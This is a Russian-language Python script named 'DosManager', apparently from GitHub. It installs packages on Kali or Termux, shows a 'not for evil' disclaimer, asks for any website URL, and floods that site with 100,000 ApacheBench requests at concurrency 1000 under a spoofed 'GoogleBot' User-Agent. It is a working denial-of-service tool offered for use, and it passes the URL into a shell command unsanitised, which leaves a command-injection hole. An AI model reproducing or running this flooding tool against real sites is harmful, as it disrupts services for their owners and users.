#!/usr/bin/env python 3
import subprocess

start = input("Вы пользуетесь скриптом в первый раз? [Y/N]")
if start == "Y":
    kali_termux = input("Где ты работаешь? [Kali Linux/Termux](K/T) :>")
    if kali_termux == "T":
        subprocess.call("apt-get update", shell=True)
        subprocess.call("apt-get install toilet", shell=True)
        subprocess.call("pkg install apache2", shell=True)
        print("скрипт подготовлен к запуску! Начинаем.")
    elif kali_termux == "K":
        subprocess.call("apt-get update", shell=True)
        print("пакеты успешно обновлены!")
        print("установка всего необходимого...")
        subprocess.call("apt-get install toilet", shell=True)
        print("скрипт подготовлен к запуску!")
    elif kali_termux == "k":
        subprocess.call("apt-get update", shell=True)
        print("пакеты успешно обновлены!")
        print("установка всего необходимого...")
        subprocess.call("apt-get install toilet", shell=True)
        print("скрипт подготовлен к запуску!")
    elif kali_termux == "t":
        subprocess.call("apt-get update", shell=True)
        subprocess.call("apt-get install toilet", shell=True)
        subprocess.call("pkg install apache2", shell=True)
        print("скрипт подготовлен к запуску! Начинаем.")
    else:
        print("Что-то пошло не так. Возможно вы ввели что-то не правильно.")
        print("Перезапустите скрипт и попробуйте ещё раз.")
        exit(0)
elif start == "y":
    kali_termux = input("Где ты работаешь? [Kali Linux/Termux](K/T) :>")
    if kali_termux == "T":
        subprocess.call("apt-get update", shell=True)
        subprocess.call("apt-get install toilet", shell=True)
        subprocess.call("pkg install apache2", shell=True)
        print("скрипт подготовлен к запуску! Начинаем.")
    elif kali_termux == "K":
        subprocess.call("apt-get update", shell=True)
        print("пакеты успешно обновлены!")
        print("установка всего необходимого...")
        subprocess.call("apt-get install toilet", shell=True)
        print("скрипт подготовлен к запуску!")
    elif kali_termux == "k":
        subprocess.call("apt-get update", shell=True)
        print("пакеты успешно обновлены!")
        print("установка всего необходимого...")
        subprocess.call("apt-get install toilet", shell=True)
        print("скрипт подготовлен к запуску!")
    elif kali_termux == "t":
        subprocess.call("apt-get update", shell=True)
        subprocess.call("apt-get install toilet", shell=True)
        subprocess.call("pkg install apache2", shell=True)
        print("скрипт подготовлен к запуску! Начинаем.")
    else:
        print("Что-то пошло не так. Возможно вы ввели что-то не правильно.")
        print("Перезапустите скрипт и попробуйте ещё раз.")
        exit(0)
elif start == "N":
    print("продолжаем")
    subprocess.call("clear", shell=True)
elif start == "n":
    subprocess.call("clear", shell=True)
    print("продолжаем")

else:
    print("Ошибка")
    exit(0)

print("данный скрипт создан в ознакомительных целях!")
print("Автор не несёт ответственности за ваши дейстивя!")
print("НЕ ИСПОЛЬЗУЙТЕ ДАННЫЙ СКРИПТ ВО ЗЛО!")

vvod = input("Вы подтверждаете что не будете использовать скрипт в противозаконных целях? [+/-] :>")
if vvod == "+":
    print("окей, продолжаем!")
elif vvod == "-":
    print("До свидания!")
    subprocess.call("clear", shell=True)
    exit(0)
else:
    print("ошибка")
    exit(0)

subprocess.call("clear", shell=True)
subprocess.call("toilet DosManager", shell=True)
subprocess.call("toilet --font term by DanGalB", shell=True)
subprocess.call("toilet --font term версия скрипта: 1.2", shell=True)
subprocess.call("toilet --font term статья на github: https://github.com/DanGalB/DosManager ", shell=True)

url = input("Введи url сайта (обязательно вставь '/' на конце! :>")
subprocess.call('ab -n 100000  -c 1000 -k -r -H "User-Agent: GoogleBot" ' + url, shell=True)
